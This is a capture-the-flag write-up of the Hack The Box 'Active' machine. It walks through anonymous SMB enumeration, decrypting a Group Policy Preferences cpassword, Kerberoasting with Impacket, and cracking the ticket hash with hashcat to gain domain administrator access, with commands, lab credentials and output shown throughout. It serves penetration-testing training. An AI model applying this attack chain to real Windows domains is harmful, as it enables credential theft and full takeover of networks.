---
title: "Active"
description: "Writeup for Active machine from HTB"
date: 2018-10-18
author: "Pablo Jesús González Rubio"
cover: "active.png"
coverAlt: "Active icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

I've put the machine IP in `/etc/hosts` for easy access:

```txt
10.10.10.100 active.htb
```

Running Nmap against the host:

```txt
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-10-17 20:52:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows


Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2018-10-17 22:53:29
|_  start_date: 2018-10-17 21:20:49
```

## Poking Samba

In the Nmap result, Samba is open so we can connect with a Samba client. Let's enumerate files we can have access to:

`smbclient -L 10.10.10.100`

```txt
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Let's search in `Replication` folder:

`smbclient //10.10.10.100/Replication`

```txt
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018

		10459647 blocks of size 4096. 4913160 blocks available
```

Inside there's this `active.htb` folder. I downloaded it as it may contain several files, and it's easier to explore it in our filesystem.

```txt
smb: \> lcd /root/htb/active/
smb: \> mask ""
smb: \> prompt off
smb: \> recurse ON
smb: \> mget active.htb
```

Inside the folder:

```txt
root@nonuser:~# cd htb/active/
root@nonuser:~/htb/active# ls
active.htb
root@nonuser:~/htb/active# cd active.htb/
root@nonuser:~/htb/active/active.htb# ls
DfsrPrivate  Policies  scripts
root@nonuser:~/htb/active/active.htb# cd Policies/
root@nonuser:~/htb/active/active.htb/Policies# ls
{31B2F340-016D-11D2-945F-00C04FB984F9}  {6AC1786C-016F-11D2-945F-00C04fB984F9}
```

I looked at both directories in Policies, but the one interesting was `{31B2F340-016D-11D2-945F-00C04FB984F9}`.

```txt
root@nonuser:~/htb/active/active.htb/Policies# cd {31B2F340-016D-11D2-945F-00C04FB984F9}
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}# ls
 GPT.INI  'Group Policy'   MACHINE   USER
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}# cd MACHINE
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE# ls
Microsoft  Preferences  Registry.pol
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE# cd Preferences
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences# ls
Groups
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences# cd Groups
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups# ls
Groups.xml
```

## User (GPP)

Looking at a Groups file usually indicates the User Groups that are in a Windows System, so we may retrieve some info from there:

```txt
root@nonuser:~/htb/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups# cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

We can see there is this user `SVC_TGS` and its password encrypted (cpassword). Group Policy Preferences sets up this password for the Local Administrator account.

It's encrypted in [AES-32](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?), and the key is for public use, so it's practically plaintext.

There is a tool in Kali called `gpp-decrypt` that allows to just that, decrypt Group Policy Preferences (GPP) passwords:

```txt
root@nonuser:~# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```

> There is a Metasploit post module (post/windows/gather/credentials/gpp) that allows retrieving the final password if we had a shell.

So we have the Local Administrator `SVC_TGS` with password `GPPstillStandingStrong2k18`. Let's login again in Samba with his credentials:

```txt
root@nonuser:~# smbclient //10.10.10.100/Users --user=SVC_TGS
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                         DHS        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                      DHS        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018
		10459647 blocks of size 4096. 4893142 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 17:16:32 2018
  ..                                  D        0  Sat Jul 21 17:16:32 2018
  Contacts                            D        0  Sat Jul 21 17:14:11 2018
  Desktop                             D        0  Sat Jul 21 17:14:42 2018
  Downloads                           D        0  Sat Jul 21 17:14:23 2018
  Favorites                           D        0  Sat Jul 21 17:14:44 2018
  Links                               D        0  Sat Jul 21 17:14:57 2018
  My Documents                        D        0  Sat Jul 21 17:15:03 2018
  My Music                            D        0  Sat Jul 21 17:15:32 2018
  My Pictures                         D        0  Sat Jul 21 17:15:43 2018
  My Videos                           D        0  Sat Jul 21 17:15:53 2018
  Saved Games                         D        0  Sat Jul 21 17:16:12 2018
  Searches                            D        0  Sat Jul 21 17:16:24 2018
		10459647 blocks of size 4096. 4965371 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 17:14:42 2018
  ..                                  D        0  Sat Jul 21 17:14:42 2018
  user.txt                            A       34  Sat Jul 21 17:06:25 2018

		10459647 blocks of size 4096. 4965371 blocks available
smb: \SVC_TGS\Desktop\> lcd /root/htb/active/
smb: \SVC_TGS\Desktop\> mget user.txt
Get file user.txt? yes
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
smb: \SVC_TGS\Desktop\>
```

We have user.txt!

```txt
root@nonuser:~/htb/active# cat user.txt 
****************************e983
```

## Root (Kerberos)

Now that we have access to the Local Administrator, we may try to escalate privileges via the Active Directory with Kerberos.

Kerberos uses a System of tickets to grant access to users to determined functions, cracking this is called **Kerberoast**.

With a tool from [Impacket](https://github.com/SecureAuthCorp/impacket) called 'GetUserSPNs' we may get the Service Principal Names.

As the description of the tool says:

> This module will try to find Service Principal Names that are associated with normal user account.
> Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
> will encrypt the ticket with the account the SPN is running under, this could be used for an offline
> bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.

So if we get the SPN's, we may get the ticket that grants us access to the rest of the functionalities.

```txt
root@nonuser:~/impacket/examples# ./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
Impacket v0.9.18-dev - Copyright 2018 SecureAuth Corporation

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7dab0eb7f81a9e6d9a17a081fd44c5c7$5fda79e1392542d15c5be1c041129f6814f66efcf3edd01bc8bc73331e78e12371f1babefe0110e8100605581a3ff596fd7a35b255ae495d15a80543e8db9f92030b9410f6b863f7912cf32cf4558f23eb63c4bc6afebaabbf08e731580282a3350935fe9f7144ec18806cdb1ec3f76b94f99df4a6722edd3015b0d380bc7564187c54cce6de6ae733fcbe70eb0625bd62da6e613574db885e8c5dba5ffd94beeec40d4f6c009a89f32ca571cdbf4b7830b344406cb7ba3a4f2e2b5970ce47d629d15d7b972e8f049e860bd79bdeb862de1502a173f0d74cf5a9822ba3de43cd1eb37f688c8d9cac945d45aed8eeaef93de36213b9746c088698fb89c41cb90f18c91d45ccd595eb2a6c1b7dc6c74ecb65dbfd72fc2ab4d5e8a1ee8d16ce6d8705602d9d5b0024c7622de179b5852c178a4a53faeecaa329a23d0db00a187d76b225e7109ce913e8f938592847fed4b4651a789919350892f3ff056b0f0b1c83106dd4d4c10d8e4ff691b3949adb767594ab24d52f80f8e3de051fec00082ce718c1418b32282a68cd82c7bb85a5e89d9452943ba11e87884f73d0293c221799a9265885cd30d8c16d351014e0b49421836819c19fc705715edea1d78e7748bace9f13b576bcc1fff32bd0f4dac0fa54fe1e73f1b6c0703805f581bff78e8280b6732fac805b694fc8c5ca601a2d263dec351bac9f20dd98cb83713fb06df92dbf7bd1057e4a8ca0e23706fcdd33087d20d0cc3b38f50e0795f4b969fc88fdd040de3540ae43860e59486c0a075df5029ad4595b46bf6f51bbb56f0623ee6956c4c094620be47a3c8de09bf2529fc2792ea53fef8b6d7e63c416dd5016ee0cb9efb71da7465bfc5e9efd3675ec71f08cebc9bff48ae6590dcf88ef6efb4bb539be68646175db2bc67aab07a666b809d2fc78721e076dec3dae13315334f7fe02a45586eb8cc1445cc0579073d1b8d925e68bc1b4dd4da51fd8f15bd97db06e4eb0b35cf415b50f195a3549586dabd14fe2e7699c4cacd269afc72a5e1b425af11b652f3f58230f0d8c36c6a517f43044a5c6894e02b4fded8c459e27ec3b3f965dd314e0253e28f07268883b39a4c9268c4db0f2cd2f210f54583e9b329f5d94e596002c68a1608c0ab6590681844421c97b4fd091a6505b473ece2e7eee9cbadbc8ca09c180465b699e8a60876657b3ef5fafba98c14ae26b8877ac03eace58c89961c12d4ab9369bbd6b5f72d4c711d9eb1b048126a12af6d0
```

The resultant hash is different in each case, so don't worry if yours is different from this.

We put the hash in a `.txt` and decrypt it with hashcat:

```txt
hashcat -m 13100 -a 0 --force kerberos_admin.txt /usr/share/wordlists/rockyou.txt
```

Administrator Password is `Ticketmaster1968`. In Linux the admin is `root`, but in Windows is called `administrator`.

So let's log in again in Samba with those credentials:

```txt
root@nonuser:~# smbclient //10.10.10.100/C$ --user=administrator
Enter WORKGROUP\administrator's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Tue Jul 14 04:34:39 2009
  Config.Msi                        DHS        0  Mon Jul 30 16:10:06 2018
  Documents and Settings            DHS        0  Tue Jul 14 07:06:44 2009
  pagefile.sys                      AHS 4294500352  Thu Oct 18 21:51:51 2018
  PerfLogs                            D        0  Tue Jul 14 05:20:08 2009
  Program Files                      DR        0  Wed Jul 18 20:44:51 2018
  Program Files (x86)                DR        0  Wed Jul 18 20:44:52 2018
  ProgramData                        DH        0  Mon Jul 30 15:49:31 2018
  Recovery                          DHS        0  Mon Jul 16 12:13:22 2018
  System Volume Information         DHS        0  Wed Jul 18 20:45:01 2018
  Users                              DR        0  Sat Jul 21 16:39:20 2018
  Windows                             D        0  Mon Jul 30 15:42:18 2018

		10459647 blocks of size 4096. 4932139 blocks available
smb: \> cd Users/Administrator/Desktop
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Mon Jul 30 15:50:10 2018
  ..                                 DR        0  Mon Jul 30 15:50:10 2018
  desktop.ini                       AHS      282  Mon Jul 30 15:50:10 2018
  root.txt                            A       34  Sat Jul 21 17:06:07 2018

		10459647 blocks of size 4096. 4932139 blocks available
smb: \Users\Administrator\Desktop\> 
```

We have root!

```txt
root@nonuser:~/Documentos/active.htb# cat root.txt
****************************708b
```

## References

[Adsecurity - Exploiting GPP](https://adsecurity.org/?p=2288)

[Hacking Articles - Guide to Impacket](http://www.hackingarticles.in/beginner-guide-to-impacket-tool-kit/)

[Black Hills - Kerberoast](https://www.blackhillsinfosec.com/a-toa)
